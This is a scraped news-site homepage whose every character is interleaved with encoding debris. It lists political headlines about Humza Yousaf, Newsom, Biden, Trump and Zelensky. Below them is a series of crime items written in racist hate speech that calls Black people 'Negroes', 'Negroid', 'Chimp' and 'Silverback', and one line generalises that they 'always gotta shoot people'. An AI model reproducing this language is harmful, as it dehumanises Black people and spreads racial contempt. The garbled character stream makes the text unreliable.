G‚Äée‚Äét‚Äé ‚ÄéA‚Äél‚Äél‚Äé ‚ÄéB‚Äér‚Äée‚Äéi‚Äét‚Äéb‚Äéa‚Äér‚Äét‚Äé ‚ÄéN‚Äée‚Äéw‚Äés‚Äé ‚ÄéH‚Äée‚Äér‚Äée‚Äé
H‚Äéo‚Äém‚Äée‚ÄéP‚Äéa‚Äég‚Äée‚Äé
S‚Äéc‚Äéo‚Äét‚Äél‚Äéa‚Äén‚Äéd‚Äé‚Äô‚Äés‚Äé ‚ÄéH‚Äéu‚Äém‚Äéz‚Äéa‚Äé ‚ÄéY‚Äéo‚Äéu‚Äés‚Äéa‚Äéf‚Äé ‚ÄéR‚Äée‚Äés‚Äéi‚Äég‚Äén‚Äés‚Äé ‚ÄéL‚Äée‚Äés‚Äés‚Äé ‚ÄéT‚Äéh‚Äéa‚Äén‚Äé ‚Äé1‚Äé ‚ÄéM‚Äéo‚Äén‚Äét‚Äéh‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéS‚Äét‚Äéa‚Äér‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéH‚Äéa‚Äét‚Äée‚Äé ‚ÄéS‚Äép‚Äée‚Äée‚Äéc‚Äéh‚Äé ‚ÄéC‚Äée‚Äén‚Äés‚Äéo‚Äér‚Äés‚Äéh‚Äéi‚Äép‚Äé ‚ÄéL‚Äéa‚Äéw‚Äé

E‚Äéx‚Äéi‚Äét‚Äé ‚ÄéS‚Äép‚Äée‚Äée‚Äéc‚Äéh‚Äé:‚Äé ‚ÄéI‚Äé‚Äô‚Äém‚Äé ‚Äés‚Äéo‚Äé ‚ÄéP‚Äér‚Äéi‚Äén‚Äéc‚Äéi‚Äép‚Äél‚Äée‚Äéd‚Äé‚Ä¶‚Äé ‚ÄéC‚Äée‚Äél‚Äée‚Äéb‚Äér‚Äéa‚Äét‚Äée‚Äé ‚ÄéM‚Äéu‚Äél‚Äét‚Äéi‚Äéc‚Äéu‚Äél‚Äét‚Äéu‚Äér‚Äéa‚Äél‚Äéi‚Äés‚Äém‚Äé!‚Äé
S‚Äéc‚Äéo‚Äét‚Äél‚Äéa‚Äén‚Äéd‚Äé'‚Äés‚Äé ‚ÄéF‚Äéi‚Äér‚Äés‚Äét‚Äé ‚ÄéM‚Äéi‚Äén‚Äéi‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéH‚Äéu‚Äém‚Äéz‚Äéa‚Äé ‚ÄéY‚Äéo‚Äéu‚Äés‚Äéa‚Äéf‚Äé ‚Äéa‚Äén‚Äén‚Äéo‚Äéu‚Äén‚Äéc‚Äée‚Äés‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚Äér‚Äée‚Äés‚Äéi‚Äég‚Äén‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéd‚Äéu‚Äér‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äé ‚Äés‚Äét‚Äéa‚Äét‚Äée‚Äém‚Äée‚Äén‚Äét‚Äé,‚Äé ‚Äéa‚Äét‚Äé ‚ÄéB‚Äéu‚Äé
H‚Äéu‚Äém‚Äéz‚Äéa‚Äé ‚ÄéY‚Äéo‚Äéu‚Äés‚Äéa‚Äéf‚Äé ‚Äéa‚Äén‚Äén‚Äéo‚Äéu‚Äén‚Äéc‚Äée‚Äéd‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚Äér‚Äée‚Äés‚Äéi‚Äég‚Äén‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéa‚Äés‚Äé ‚ÄéS‚Äéc‚Äéo‚Äét‚Äét‚Äéi‚Äés‚Äéh‚Äé ‚ÄéF‚Äéi‚Äér‚Äés‚Äét‚Äé ‚ÄéM‚Äéi‚Äén‚Äéi‚Äés‚Äét‚Äée‚Äér‚Äé ‚Äéo‚Äén‚Äé ‚ÄéM‚Äéo‚Äén‚Äéd‚Äéa‚Äéy‚Äé ‚Äém‚Äéo‚Äér‚Äén‚Äéi‚Äén‚Äég‚Äé ‚Äéb‚Äée‚Äéf‚Äéo‚Äér‚Äée‚Äé ‚Äéf‚Äéa‚Äéc‚Äéi‚Äén‚Äég‚Äé ‚Äéb‚Äée‚Äéi‚Äén‚Äég‚Äé ‚Äéf‚Äéo‚Äér‚Äéc‚Äéi‚Äéb‚Äél‚Äéy‚Äé ‚Äér‚Äée‚Äém‚Äéo‚Äév‚Äée‚Äéd‚Äé.‚Äé

C‚Äéa‚Äél‚Äéi‚Äéf‚Äéo‚Äér‚Äén‚Äéi‚Äéa‚Äé ‚ÄéG‚Äéo‚Äév‚Äé.‚Äé ‚ÄéG‚Äéa‚Äév‚Äéi‚Äén‚Äé ‚ÄéN‚Äée‚Äéw‚Äés‚Äéo‚Äém‚Äé ‚ÄéP‚Äér‚Äéo‚Äéc‚Äél‚Äéa‚Äéi‚Äém‚Äés‚Äé ‚ÄéA‚Äép‚Äér‚Äéi‚Äél‚Äé ‚Äéa‚Äés‚Äé ‚ÄéA‚Äér‚Äéa‚Äéb‚Äé ‚ÄéA‚Äém‚Äée‚Äér‚Äéi‚Äéc‚Äéa‚Äén‚Äé ‚ÄéH‚Äée‚Äér‚Äéi‚Äét‚Äéa‚Äég‚Äée‚Äé ‚ÄéM‚Äéo‚Äén‚Äét‚Äéh‚Äé
C‚Äéa‚Äél‚Äéi‚Äéf‚Äéo‚Äér‚Äén‚Äéi‚Äéa‚Äé ‚ÄéG‚Äéo‚Äév‚Äé.‚Äé ‚ÄéN‚Äée‚Äéw‚Äés‚Äéo‚Äém‚Äé ‚ÄéP‚Äér‚Äéo‚Äéc‚Äél‚Äéa‚Äéi‚Äém‚Äés‚Äé ‚ÄéA‚Äép‚Äér‚Äéi‚Äél‚Äé ‚Äéa‚Äés‚Äé ‚ÄéA‚Äér‚Äéa‚Äéb‚Äé ‚ÄéA‚Äém‚Äée‚Äér‚Äéi‚Äéc‚Äéa‚Äén‚Äé ‚ÄéH‚Äée‚Äér‚Äéi‚Äét‚Äéa‚Äég‚Äée‚Äé ‚ÄéM‚Äéo‚Äén‚Äét‚Äéh‚Äé
1‚Äé,‚Äé1‚Äé0‚Äé1‚Äé
B‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚ÄéR‚Äéo‚Äéa‚Äés‚Äét‚Äés‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚Äéa‚Äét‚Äé ‚ÄéW‚ÄéH‚ÄéC‚ÄéD‚Äé:‚Äé ‚Äé‚Äò‚ÄéI‚Äé‚Äô‚Äém‚Äé ‚Äéa‚Äé ‚ÄéG‚Äér‚Äéo‚Äéw‚Äén‚Äé ‚ÄéM‚Äéa‚Äén‚Äé ‚ÄéR‚Äéu‚Äén‚Äén‚Äéi‚Äén‚Äég‚Äé ‚ÄéA‚Äég‚Äéa‚Äéi‚Äén‚Äés‚Äét‚Äé ‚Äéa‚Äé ‚ÄéS‚Äéi‚Äéx‚Äé-‚ÄéY‚Äée‚Äéa‚Äér‚Äé-‚ÄéO‚Äél‚Äéd‚Äé‚Äô‚Äé
J‚Äéo‚Äée‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚ÄéR‚Äéo‚Äéa‚Äés‚Äét‚Äés‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé:‚Äé ‚Äé'‚ÄéI‚Äé'‚Äém‚Äé ‚Äéa‚Äé ‚ÄéG‚Äér‚Äéo‚Äéw‚Äén‚Äé ‚ÄéM‚Äéa‚Äén‚Äé ‚ÄéR‚Äéu‚Äén‚Äén‚Äéi‚Äén‚Äég‚Äé ‚ÄéA‚Äég‚Äéa‚Äéi‚Äén‚Äés‚Äét‚Äé ‚Äéa‚Äé ‚ÄéS‚Äéi‚Äéx‚Äé-‚ÄéY‚Äée‚Äéa‚Äér‚Äé-‚ÄéO‚Äél‚Äéd‚Äé'‚Äé
6‚Äé,‚Äé5‚Äé1‚Äé4‚Äé
P‚Äér‚Äéo‚Äét‚Äée‚Äés‚Äét‚Äée‚Äér‚Äés‚Äé ‚ÄéR‚Äée‚Äém‚Äéo‚Äév‚Äée‚Äé ‚ÄéA‚Äém‚Äée‚Äér‚Äéi‚Äéc‚Äéa‚Äén‚Äé ‚ÄéF‚Äél‚Äéa‚Äég‚Äé,‚Äé ‚ÄéR‚Äéa‚Äéi‚Äés‚Äée‚Äé ‚ÄéP‚Äéa‚Äél‚Äée‚Äés‚Äét‚Äéi‚Äén‚Äéi‚Äéa‚Äén‚Äé ‚ÄéF‚Äél‚Äéa‚Äég‚Äé ‚Äéi‚Äén‚Äé ‚ÄéH‚Äéa‚Äér‚Äév‚Äéa‚Äér‚Äéd‚Äé ‚ÄéY‚Äéa‚Äér‚Äéd‚Äé
P‚Äér‚Äéo‚Äét‚Äée‚Äés‚Äét‚Äée‚Äér‚Äés‚Äé ‚ÄéR‚Äée‚Äém‚Äéo‚Äév‚Äée‚Äé ‚ÄéA‚Äém‚Äée‚Äér‚Äéi‚Äéc‚Äéa‚Äén‚Äé ‚ÄéF‚Äél‚Äéa‚Äég‚Äé,‚Äé ‚ÄéR‚Äéa‚Äéi‚Äés‚Äée‚Äé ‚ÄéP‚Äéa‚Äél‚Äée‚Äés‚Äét‚Äéi‚Äén‚Äéi‚Äéa‚Äén‚Äé ‚ÄéF‚Äél‚Äéa‚Äég‚Äé ‚Äéi‚Äén‚Äé ‚ÄéH‚Äéa‚Äér‚Äév‚Äéa‚Äér‚Äéd‚Äé ‚ÄéY‚Äéa‚Äér‚Äéd‚Äé
7‚Äé5‚Äé7‚Äé
J‚Äée‚Äér‚Äér‚Äéy‚Äé ‚ÄéS‚Äée‚Äéi‚Äén‚Äéf‚Äée‚Äél‚Äéd‚Äé:‚Äé ‚ÄéW‚Äéo‚Äék‚Äée‚Äén‚Äée‚Äés‚Äés‚Äé,‚Äé ‚Äé‚Äò‚ÄéE‚Äéx‚Äét‚Äér‚Äée‚Äém‚Äée‚Äé ‚ÄéL‚Äée‚Äéf‚Äét‚Äé‚Äô‚Äé ‚ÄéK‚Äéi‚Äél‚Äél‚Äéi‚Äén‚Äég‚Äé ‚ÄéC‚Äéo‚Äém‚Äée‚Äéd‚Äéy‚Äé
J‚Äée‚Äér‚Äér‚Äéy‚Äé ‚ÄéS‚Äée‚Äéi‚Äén‚Äéf‚Äée‚Äél‚Äéd‚Äé:‚Äé ‚ÄéW‚Äéo‚Äék‚Äée‚Äén‚Äée‚Äés‚Äés‚Äé,‚Äé ‚Äé'‚ÄéE‚Äéx‚Äét‚Äér‚Äée‚Äém‚Äée‚Äé ‚ÄéL‚Äée‚Äéf‚Äét‚Äé'‚Äé ‚ÄéK‚Äéi‚Äél‚Äél‚Äéi‚Äén‚Äég‚Äé ‚ÄéC‚Äéo‚Äém‚Äée‚Äéd‚Äéy‚Äé
6‚Äé6‚Äé
D‚Äéo‚Äén‚Äéa‚Äél‚Äéd‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚ÄéT‚Äéa‚Äék‚Äée‚Äés‚Äé ‚ÄéB‚Äéi‚Äég‚Äég‚Äée‚Äés‚Äét‚Äé ‚ÄéL‚Äée‚Äéa‚Äéd‚Äé ‚ÄéE‚Äév‚Äée‚Äér‚Äé ‚Äéo‚Äév‚Äée‚Äér‚Äé ‚ÄéJ‚Äéo‚Äée‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚Äéi‚Äén‚Äé ‚ÄéC‚ÄéN‚ÄéN‚Äé ‚ÄéP‚Äéo‚Äél‚Äél‚Äé,‚Äé ‚ÄéT‚Äéh‚Äéi‚Äér‚Äéd‚Äé-‚ÄéP‚Äéa‚Äér‚Äét‚Äéy‚Äé ‚ÄéC‚Äéa‚Äén‚Äéd‚Äéi‚Äéd‚Äéa‚Äét‚Äée‚Äés‚Äé ‚ÄéE‚Äéx‚Äép‚Äéa‚Äén‚Äéd‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äé
D‚Äéo‚Äén‚Äéa‚Äél‚Äéd‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚ÄéT‚Äéa‚Äék‚Äée‚Äés‚Äé ‚ÄéB‚Äéi‚Äég‚Äég‚Äée‚Äés‚Äét‚Äé ‚ÄéL‚Äée‚Äéa‚Äéd‚Äé ‚ÄéE‚Äév‚Äée‚Äér‚Äé ‚ÄéO‚Äév‚Äée‚Äér‚Äé ‚ÄéJ‚Äéo‚Äée‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚Äéi‚Äén‚Äé ‚ÄéC‚ÄéN‚ÄéN‚Äé ‚ÄéP‚Äéo‚Äél‚Äél‚Äé
7‚Äé,‚Äé6‚Äé8‚Äé3‚Äé
Z‚Äée‚Äél‚Äée‚Äén‚Äés‚Äék‚Äéy‚Äé ‚ÄéR‚Äée‚Äév‚Äée‚Äéa‚Äél‚Äés‚Äé ‚ÄéU‚Äé.‚ÄéS‚Äé.‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéU‚Äék‚Äér‚Äéa‚Äéi‚Äén‚Äée‚Äé ‚Äé‚Äò‚ÄéW‚Äéo‚Äér‚Äék‚Äéi‚Äén‚Äég‚Äé‚Äô‚Äé ‚Äéo‚Äén‚Äé ‚ÄéS‚Äéc‚Äéh‚Äée‚Äém‚Äée‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äé1‚Äé0‚Äé ‚ÄéY‚Äée‚Äéa‚Äér‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéM‚Äéi‚Äél‚Äéi‚Äét‚Äéa‚Äér‚Äéy‚Äé ‚ÄéA‚Äéi‚Äéd‚Äé
Z‚Äée‚Äél‚Äée‚Äén‚Äés‚Äék‚Äéy‚Äé ‚ÄéR‚Äée‚Äév‚Äée‚Äéa‚Äél‚Äés‚Äé ‚Äé1‚Äé0‚Äé-‚ÄéY‚Äée‚Äéa‚Äér‚Äé ‚ÄéP‚Äél‚Äéa‚Äén‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéU‚Äé.‚ÄéS‚Äé.‚Äé ‚Äét‚Äéo‚Äé ‚ÄéS‚Äée‚Äén‚Äéd‚Äé ‚ÄéA‚Äéi‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚ÄéU‚Äék‚Äér‚Äéa‚Äéi‚Äén‚Äée‚Äé
3‚Äé,‚Äé5‚Äé5‚Äé6‚Äé
S‚Äéc‚Äéo‚Äét‚Äét‚Äéi‚Äés‚Äéh‚Äé ‚ÄéF‚Äéi‚Äér‚Äés‚Äét‚Äé ‚ÄéM‚Äéi‚Äén‚Äéi‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéH‚Äéu‚Äém‚Äéz‚Äéa‚Äé ‚ÄéY‚Äéo‚Äéu‚Äés‚Äéa‚Äéf‚Äé ‚ÄéR‚Äée‚Äés‚Äéi‚Äég‚Äén‚Äés‚Äé ‚ÄéL‚Äée‚Äés‚Äés‚Äé ‚ÄéT‚Äéh‚Äéa‚Äén‚Äé ‚ÄéO‚Äén‚Äée‚Äé ‚ÄéM‚Äéo‚Äén‚Äét‚Äéh‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéI‚Äén‚Äét‚Äér‚Äéo‚Äéd‚Äéu‚Äéc‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéH‚Äéa‚Äét‚Äée‚Äé ‚ÄéS‚Äép‚Äée‚Äée‚Äéc‚Äéh‚Äé ‚Äé
H‚Äéu‚Äém‚Äéz‚Äéa‚Äé ‚ÄéY‚Äéo‚Äéu‚Äés‚Äéa‚Äéf‚Äé ‚ÄéR‚Äée‚Äés‚Äéi‚Äég‚Äén‚Äés‚Äé ‚ÄéL‚Äée‚Äés‚Äés‚Äé ‚ÄéT‚Äéh‚Äéa‚Äén‚Äé ‚ÄéO‚Äén‚Äée‚Äé ‚ÄéM‚Äéo‚Äén‚Äét‚Äéh‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéI‚Äém‚Äép‚Äéo‚Äés‚Äéi‚Äén‚Äég‚Äé ‚ÄéH‚Äéa‚Äét‚Äée‚Äé ‚ÄéS‚Äép‚Äée‚Äée‚Äéc‚Äéh‚Äé ‚ÄéL‚Äéa‚Äéw‚Äé
1‚Äé,‚Äé0‚Äé4‚Äé0‚Äé
F‚Äéo‚Äér‚Äéd‚Äé ‚ÄéL‚Äéo‚Äés‚Äée‚Äés‚Äé ‚Äé$‚Äé1‚Äé.‚Äé3‚Äé ‚ÄéB‚Äéi‚Äél‚Äél‚Äéi‚Äéo‚Äén‚Äé ‚Äéo‚Äén‚Äé ‚ÄéE‚Äél‚Äée‚Äéc‚Äét‚Äér‚Äéi‚Äéc‚Äé ‚ÄéV‚Äée‚Äéh‚Äéi‚Äéc‚Äél‚Äée‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚ÄéF‚Äéi‚Äér‚Äés‚Äét‚Äé ‚ÄéQ‚Äéu‚Äéa‚Äér‚Äét‚Äée‚Äér‚Äé ‚Äéo‚Äéf‚Äé ‚Äé2‚Äé0‚Äé2‚Äé4‚Äé,‚Äé ‚ÄéD‚Äée‚Äél‚Äéa‚Äéy‚Äés‚Äé ‚ÄéP‚Äél‚Äéa‚Äén‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚ÄéM‚Äéa‚Äék‚Äée‚Äé ‚ÄéM‚Äéo‚Äér‚Äée‚Äé
F‚Äéo‚Äér‚Äéd‚Äé ‚ÄéL‚Äéo‚Äés‚Äée‚Äés‚Äé ‚Äé$‚Äé1‚Äé.‚Äé3‚Äé ‚ÄéB‚Äéi‚Äél‚Äél‚Äéi‚Äéo‚Äén‚Äé ‚Äéo‚Äén‚Äé ‚ÄéE‚Äél‚Äée‚Äéc‚Äét‚Äér‚Äéi‚Äéc‚Äé ‚ÄéV‚Äée‚Äéh‚Äéi‚Äéc‚Äél‚Äée‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚ÄéF‚Äéi‚Äér‚Äés‚Äét‚Äé ‚ÄéQ‚Äéu‚Äéa‚Äér‚Äét‚Äée‚Äér‚Äé ‚Äéo‚Äéf‚Äé ‚Äé2‚Äé0‚Äé2‚Äé4‚Äé
5‚Äé,‚Äé1‚Äé2‚Äé7‚Äé
W‚ÄéA‚ÄéT‚ÄéC‚ÄéH‚Äé:‚Äé ‚ÄéP‚Äér‚Äéo‚Äé-‚ÄéI‚Äés‚Äér‚Äéa‚Äée‚Äél‚Äé,‚Äé ‚ÄéP‚Äér‚Äéo‚Äé-‚ÄéP‚Äéa‚Äél‚Äée‚Äés‚Äét‚Äéi‚Äén‚Äéi‚Äéa‚Äén‚Äé ‚ÄéP‚Äér‚Äéo‚Äét‚Äée‚Äés‚Äét‚Äée‚Äér‚Äés‚Äé ‚ÄéC‚Äél‚Äéa‚Äés‚Äéh‚Äé ‚Äéa‚Äét‚Äé ‚ÄéU‚ÄéC‚ÄéL‚ÄéA‚Äé ‚Äé‚Äò‚ÄéE‚Äén‚Äéc‚Äéa‚Äém‚Äép‚Äém‚Äée‚Äén‚Äét‚Äé‚Äô‚Äé
W‚ÄéA‚ÄéT‚ÄéC‚ÄéH‚Äé:‚Äé ‚ÄéP‚Äér‚Äéo‚Äé-‚ÄéI‚Äés‚Äér‚Äéa‚Äée‚Äél‚Äé ‚ÄéC‚Äéo‚Äéu‚Äén‚Äét‚Äée‚Äér‚Äé-‚Äép‚Äér‚Äéo‚Äét‚Äée‚Äés‚Äét‚Äée‚Äér‚Äés‚Äé ‚ÄéF‚Äéa‚Äéc‚Äée‚Äé ‚ÄéP‚Äéa‚Äél‚Äée‚Äés‚Äét‚Äéi‚Äén‚Äéi‚Äéa‚Äén‚Äé ‚Äé'‚ÄéE‚Äén‚Äéc‚Äéa‚Äém‚Äép‚Äém‚Äée‚Äén‚Äét‚Äé'‚Äé ‚Äéa‚Äét‚Äé ‚ÄéU‚ÄéC‚ÄéL‚ÄéA‚Äé
2‚Äé,‚Äé6‚Äé9‚Äé9‚Äé
N‚Äéo‚Äél‚Äét‚Äée‚Äé:‚Äé ‚ÄéN‚Äée‚Äéw‚Äé ‚ÄéG‚Äéu‚Äéi‚Äén‚Äée‚Äéa‚Äé ‚ÄéR‚Äée‚Äés‚Äéi‚Äéd‚Äée‚Äén‚Äét‚Äés‚Äé ‚ÄéS‚Äét‚Äéi‚Äél‚Äél‚Äé ‚ÄéO‚Äéu‚Äét‚Äér‚Äéa‚Äég‚Äée‚Äéd‚Äé ‚Äéo‚Äév‚Äée‚Äér‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé‚Äô‚Äés‚Äé ‚Äé‚Äò‚ÄéC‚Äéa‚Äén‚Äén‚Äéi‚Äéb‚Äéa‚Äél‚Äé‚Äô‚Äé ‚ÄéL‚Äéi‚Äée‚Äé
N‚Äéo‚Äél‚Äét‚Äée‚Äé:‚Äé ‚ÄéN‚Äée‚Äéw‚Äé ‚ÄéG‚Äéu‚Äéi‚Äén‚Äée‚Äéa‚Äé ‚ÄéR‚Äée‚Äés‚Äéi‚Äéd‚Äée‚Äén‚Äét‚Äés‚Äé ‚ÄéO‚Äéu‚Äét‚Äér‚Äéa‚Äég‚Äée‚Äéd‚Äé ‚Äéo‚Äév‚Äée‚Äér‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé‚Äô‚Äés‚Äé ‚Äé‚Äò‚ÄéC‚Äéa‚Äén‚Äén‚Äéi‚Äéb‚Äéa‚Äél‚Äé‚Äô‚Äé ‚ÄéL‚Äéi‚Äée‚Äé

N‚Äéi‚Äég‚Äél‚Äéo‚Äéd‚Äéy‚Äét‚Äée‚Äé ‚ÄéS‚Äéh‚Äéo‚Äéo‚Äét‚Äés‚Äé ‚Äéu‚Äép‚Äé ‚ÄéA‚Äéu‚Äér‚Äéo‚Äér‚Äéa‚Äé ‚ÄéW‚Äéa‚Äér‚Äée‚Äéh‚Äéo‚Äéu‚Äés‚Äée‚Äé,‚Äé ‚ÄéL‚Äée‚Äéa‚Äév‚Äéi‚Äén‚Äég‚Äé ‚Äé5‚Äé ‚ÄéP‚Äée‚Äéo‚Äép‚Äél‚Äée‚Äé ‚ÄéD‚Äée‚Äéa‚Äéd‚Äé.‚Äé ‚Äé(‚ÄéA‚Äét‚Äé ‚ÄéL‚Äée‚Äéa‚Äés‚Äét‚Äé ‚Äé3‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéT‚Äéh‚Äée‚Äém‚Äé ‚ÄéW‚Äéh‚Äéi‚Äét‚Äée‚Äé)‚Äé.‚Äé

N‚Äée‚Äég‚Äér‚Äéo‚Äée‚Äés‚Äé ‚Äéa‚Äél‚Äéw‚Äéa‚Äéy‚Äés‚Äé ‚Äég‚Äéo‚Äét‚Äét‚Äéa‚Äé ‚Äés‚Äéh‚Äéo‚Äéo‚Äét‚Äé ‚Äép‚Äée‚Äéo‚Äép‚Äél‚Äée‚Äé,‚Äé ‚Äéd‚Äéo‚Äén‚Äé'‚Äét‚Äé ‚Äét‚Äéh‚Äée‚Äéy‚Äé?‚Äé


F‚Äéa‚Äét‚Äé ‚ÄéS‚Äéi‚Äél‚Äév‚Äée‚Äér‚Äéb‚Äéa‚Äéc‚Äék‚Äé ‚ÄéB‚Äéi‚Äét‚Äéc‚Äéh‚Äé ‚ÄéG‚Äée‚Äét‚Äés‚Äé ‚Äé6‚Äé0‚Äé ‚ÄéY‚Äée‚Äéa‚Äér‚Äés‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéK‚Äéi‚Äél‚Äél‚Äéi‚Äén‚Äég‚Äé ‚ÄéW‚Äéh‚Äéi‚Äét‚Äée‚Äé ‚ÄéM‚Äéa‚Äén‚Äé ‚Äéi‚Äén‚Äé ‚ÄéL‚Äéi‚Äét‚Äét‚Äél‚Äée‚Äé ‚ÄéR‚Äéo‚Äéc‚Äék‚Äé.‚Äé


N‚Äée‚Äég‚Äér‚Äéo‚Äéi‚Äéd‚Äé ‚ÄéA‚Äér‚Äér‚Äée‚Äés‚Äét‚Äée‚Äéd‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéS‚Äét‚Äéa‚Äér‚Äét‚Äéi‚Äén‚Äég‚Äé ‚ÄéF‚Äéi‚Äér‚Äée‚Äé ‚Äéi‚Äén‚Äé ‚ÄéS‚Äéo‚Äéu‚Äét‚Äéh‚Äée‚Äér‚Äén‚Äé ‚ÄéC‚Äéa‚Äél‚Äéi‚Äéf‚Äéo‚Äér‚Äén‚Äéi‚Äéa‚Äé,‚Äé ‚ÄéC‚Äéa‚Äéu‚Äés‚Äéi‚Äén‚Äég‚Äé ‚Äé7‚ÄéK‚Äé ‚ÄéP‚Äée‚Äéo‚Äép‚Äél‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚ÄéE‚Äév‚Äéa‚Äéc‚Äéu‚Äéa‚Äét‚Äée‚Äé.‚Äé


M‚Äéa‚Äén‚Äé ‚ÄéS‚Äéu‚Äér‚Äév‚Äéi‚Äév‚Äée‚Äés‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéE‚Äér‚Äée‚Äéc‚Äét‚Äéu‚Äés‚Äé ‚ÄéP‚Äéu‚Äés‚Äéh‚Äée‚Äés‚Äé ‚ÄéH‚Äéi‚Äém‚Äé ‚Äéi‚Äén‚Äét‚Äéo‚Äé ‚ÄéO‚Äén‚Äéc‚Äéo‚Äém‚Äéi‚Äén‚Äég‚Äé ‚ÄéD‚ÄéA‚ÄéR‚ÄéT‚Äé ‚ÄéT‚Äér‚Äéa‚Äéi‚Äén‚Äé.‚Äé


M‚Äéa‚Äér‚Äéi‚Äéo‚Äén‚Äé ‚ÄéC‚Äéo‚Äéu‚Äén‚Äét‚Äéy‚Äé:‚Äé ‚ÄéC‚Äéh‚Äéi‚Äém‚Äép‚Äé ‚ÄéA‚Äér‚Äér‚Äée‚Äés‚Äét‚Äée‚Äéd‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéT‚Äéh‚Äér‚Äéo‚Äéw‚Äéi‚Äén‚Äég‚Äé ‚ÄéR‚Äéo‚Äéc‚Äék‚Äé ‚Äéa‚Äét‚Äé ‚ÄéK‚Äéi‚Äét‚Äét‚Äée‚Äén‚Äé.‚Äé


H‚Äéo‚Äél‚Äél‚Äéy‚Äéw‚Äéo‚Äéo‚Äéd‚Äé ‚ÄéM‚Äéi‚Äéx‚Äée‚Äéd‚Äé ‚ÄéR‚Äéa‚Äéc‚Äée‚Äé ‚ÄéN‚Äée‚Äég‚Äér‚Äée‚Äés‚Äés‚Äé ‚ÄéS‚Äéu‚Äée‚Äéd‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéA‚Äéb‚Äéu‚Äés‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéC‚Äéo‚Äéw‚Äéo‚Äér‚Äék‚Äée‚Äér‚Äés‚Äé.‚Äé


I‚Äér‚Äév‚Äéi‚Äén‚Äég‚Äé:‚Äé ‚ÄéS‚Äéh‚Äée‚Äéb‚Äéo‚Äéo‚Äén‚Äé ‚ÄéC‚Äér‚Äéa‚Äés‚Äéh‚Äée‚Äés‚Äé ‚ÄéH‚Äée‚Äér‚Äé ‚ÄéC‚Äéa‚Äér‚Äé ‚Äéi‚Äén‚Äét‚Äéo‚Äé ‚ÄéP‚Äéo‚Äél‚Äéi‚Äéc‚Äée‚Äé ‚ÄéV‚Äée‚Äéh‚Äéi‚Äéc‚Äél‚Äée‚Äé.‚Äé


6‚Äé ‚ÄéS‚Äép‚Äéi‚Äéc‚Äé ‚ÄéI‚Äél‚Äél‚Äée‚Äég‚Äéa‚Äél‚Äés‚Äé ‚ÄéA‚Äér‚Äér‚Äée‚Äés‚Äét‚Äée‚Äéd‚Äé ‚Äéi‚Äén‚Äé ‚ÄéD‚Äér‚Äéu‚Äég‚Äé ‚ÄéT‚Äér‚Äéa‚Äéf‚Äéf‚Äéi‚Äéc‚Äék‚Äéi‚Äén‚Äég‚Äé ‚ÄéO‚Äép‚Äée‚Äér‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéi‚Äén‚Äé ‚ÄéN‚Äéo‚Äér‚Äét‚Äéh‚Äé ‚ÄéC‚Äéa‚Äér‚Äéo‚Äél‚Äéi‚Äén‚Äéa‚Äé.‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé ‚ÄéW‚Äée‚Äéa‚Äét‚Äéh‚Äée‚Äér‚Äé.‚Äé

M‚Äéo‚Äén‚Äé ‚Äé2‚Äé9‚Äé ‚Äé|‚Äé ‚ÄéD‚Äéa‚Äéy‚Äé
8‚Äé8‚Äé¬∞‚Äé
3‚Äé%‚Äé
E‚ÄéN‚ÄéE‚Äé
7‚Äé
 ‚Äé
m‚Äép‚Äéh‚Äé
